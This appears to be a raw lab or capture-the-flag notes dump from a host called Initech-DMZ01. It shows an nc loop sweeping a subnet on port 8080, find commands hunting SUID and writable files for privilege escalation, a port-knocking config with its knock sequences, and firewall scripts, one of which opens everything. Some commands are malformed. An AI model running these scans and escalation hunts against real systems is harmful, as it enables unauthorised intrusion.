--- 192.168.122.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms


for i in $(seq 2 254); do nc -vz -w 2  1 192.168.122.$i 8080; done



thebobs@Initech-DMZ01:~$ cat /etc/libvirt/qemu/networks/default.xml
<network>
  <name>default</name>
  <bridge name="virbr0"/>
  <forward/>
  <ip address="192.168.122.1" netmask="255.255.255.0">
    <dhcp>
      <range start="192.168.122.2" end="192.168.122.254"/>
    </dhcp>
  </ip>
</network>




find / -perm -u=s -type f 2>/dev/null | xargs  ls -l
find /usr -perm -type f --writable 2>/dev/null | xargs  ls -l




root@Initech-DMZ01:/etc# cat knockd.conf 
[options]
        UseSyslog


[OpenHoneyPot]
        sequence        = 545,232,1876
        seq_timeout     = 5
        command         = /usr/local/bin/sh /root/portly2.sh
        tcpflags        = syn

[CloseHoneyPot]

        sequence        = 1876,232,545
        seq_timeout     = 5
        command         = /sbin/iptables -D INPUT -s %IP -p tcp --dports 22,2048,4096,5800,10007,10009,10010 -j ACCEPT

[openApache]
        sequence    = 555,423,1800
        seq_timeout = 5
        command     = /usr/local/bin/sh /root/portly3.sh
        tcpflags    = syn

[closeApache]
        sequence    = 1800,423,555
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 8 -j ACCEPT
        tcpflags    = syn




root@Initech-DMZ01:/root# cat portly2.sh
#!/bin/sh

iptables -F

## Set default chain policies - drop inbound and forwarded traffic. Allow inbound/outbound over virbr0
iptables -P INPUT DROP
iptables -A INPUT -i virbr0 -p all -j ACCEPT
iptables -A OUTPUT -o virbr0 -p all -j ACCEPT

## Allow outbound DNS
iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT
iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT

## Allow outbound SNMP
iptables -A INPUT -m state --state NEW -m udp -p udp --dport 161 -j ACCEPT
iptables -A OUTPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --sport 161 -j ACCEPT

## Allow connections over loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

## Allow honeypot, SSH, fake telnet and fake VNC outbound
iptables -I INPUT -m state --state NEW -m tcp -p tcp --match multiport --dports 22,23,2048,4096,5800,10007,10008,10009,10010 -j ACCEPT



root@Initech-DMZ01:/root# cat portly3.sh
#!/bin/sh

## Allow incoming Apache
iptables -A INPUT -i eth0 -p tcp --dport 8 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 8 -m state --state ESTABLISHED -j ACCEPT

## Allow outgoing Apache
iptables -A OUTPUT -o eth0 -p tcp --dport 8 -m state --state ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 8 -m state --state NEW,ESTABLISHED -j ACCEPT

## Allow incoming SSH
iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT

## Allow outgoing SSH
iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

## Block outgoing connections to deny reverse shells from DMZ 
iptables -A OUTPUT -j DROP

root@Initech-DMZ01:/root# cat portly.sh
#!/bin/sh

## Delete any existing rules
iptables -F

## Set default chain policies
iptables -P INPUT DROP
iptables -A INPUT -i virbr0 -p all -j ACCEPT

## Allow outbound DNS
iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT
iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT

# Allow outbound SNMP
iptables -A INPUT -m state  --state NEW -m udp -p udp --dport 161 -j ACCEPT
iptables -A OUTPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --sport 161 -j ACCEPT


## Allow connections over loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

root@Initech-DMZ01:/root# cat ports.sh
#!/bin/sh
iptables -F
iptables -X 
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
root@Initech-DMZ01:/root# 
